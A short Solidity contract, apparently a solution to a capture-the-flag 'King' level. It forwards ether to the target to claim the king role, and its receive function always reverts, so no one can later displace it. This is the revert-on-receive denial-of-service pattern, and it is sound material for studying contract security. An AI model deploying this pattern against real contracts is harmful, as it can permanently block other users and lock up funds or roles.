// SPDX-License-Identifier: MIT
pragma solidity 0.8.13;

interface IKing {
    function prize() external returns (uint256);
}

contract KingChallenge {
    IKing public king;

    constructor(address _king) {
        king = IKing(_king);
    }

    function claim() external payable {
        (bool success, ) = address(king).call{value: msg.value}("");
        require(success, "KingChallenge: failed");
    }

    receive() external payable {
        revert("KingChallenge: receive reverted");
    }
}
